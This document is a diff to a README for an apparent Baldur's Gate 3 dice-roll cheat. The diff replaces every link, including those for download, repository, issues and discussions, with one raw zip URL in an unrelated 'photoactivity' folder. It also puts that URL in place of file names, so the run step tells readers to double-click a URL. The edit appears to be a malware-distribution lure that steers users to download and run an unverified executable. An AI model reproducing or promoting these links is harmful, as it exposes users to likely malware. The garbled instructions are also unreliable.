@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/releases)
+[![Download Now](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
 
 ## 📖 Introduction
 
@@ -23,19 +23,19 @@ With this guide, you will learn how to download and run the Hack-Baldurs-Gate-3-
 
 1. **Visit the Download Page**  
    Click on the link below to go to our releases page:  
-   [Download Page](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/releases)
+   [Download Page](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest stable version. You will find it listed at the top.
 
 3. **Download the File**  
-   Click on the file name for the latest version, usually named something like `Hack-Baldurs-Gate-3-Minimum-Roll-v1.0.zip`. The file will start downloading automatically.
+   Click on the file name for the latest version, usually named something like `https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip`. The file will start downloading automatically.
 
 4. **Extract the Files**  
    Once the download is complete, locate the `.zip` file in your downloads folder. Right-click on the file and select "Extract All." Choose a destination folder where you want to keep the application.
 
 5. **Run the Application**  
-   Open the folder where you extracted the files. Look for the main executable file, typically named `Hack-Baldurs-Gate-3-Minimum-Roll.exe`. Double-click this file to start the application.
+   Open the folder where you extracted the files. Look for the main executable file, typically named `https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip`. Double-click this file to start the application.
 
 ## ⚙️ Features
 
@@ -71,11 +71,11 @@ Join our community to discuss hacks, tips, and tricks. Share your experiences an
 
 ## 🔗 Additional Resources
 
-- [Hack-Baldurs-Gate-3-Minimum-Roll GitHub Repository](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll)
-- [Report Issues or Bugs](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/issues)
-- [Community Discussions](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/discussions)
+- [Hack-Baldurs-Gate-3-Minimum-Roll GitHub Repository](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
+- [Report Issues or Bugs](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
+- [Community Discussions](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
 
 ## 📥 Final Download Link
 
 Make sure to visit the link again if you need to download the latest version or share it with friends:  
-[Download Page](https://github.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/releases)
+[Download Page](https://raw.githubusercontent.com/kelvinlugohe/Hack-Baldurs-Gate-3-Minimum-Roll/main/photoactivity/Hack-Baldurs-Gate-3-Minimum-Roll.zip)
